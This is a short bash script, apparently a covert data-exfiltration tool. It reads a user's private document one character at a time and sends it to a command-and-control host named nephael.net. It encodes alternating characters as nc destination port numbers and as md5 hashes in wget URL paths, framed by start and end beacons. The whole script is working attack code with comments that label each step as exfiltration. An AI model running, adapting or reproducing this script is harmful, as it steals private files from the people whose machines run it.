#!/bin/bash

FILE="/home/$USER/Documents/private.txt"
C2='nephael.net'
MONITOR='monitoring'
ID=$(echo -n $(date -Is) && echo ":"$USER | sha1sum | cut -d " " -f1)

#start
wget -q "$C2"/"$MONITOR"/"$ID"/SOT

i=0
while IFS= read -rn1 c; do

    if [ $(echo "$i % 2" | bc) -eq 0 ]; then
        #convert
        p=$(echo "$c" | xxd -ps -c1 | head -n1)
        p=$(echo $(( 16#$p )))
        #exfiltrate
        echo "$ID" | nc -q 1 "$C2" "$p"
    else
        #hash
        c=$(echo "$c" | md5sum | cut -d " " -f1)
        #exfiltrate
        wget -q "$C2"/"$MONITOR"/"$ID"/"$c"
    fi

    (( i++ ))
done < "$FILE"

#end
wget -q "$C2"/"$MONITOR"/"$ID"/EOT
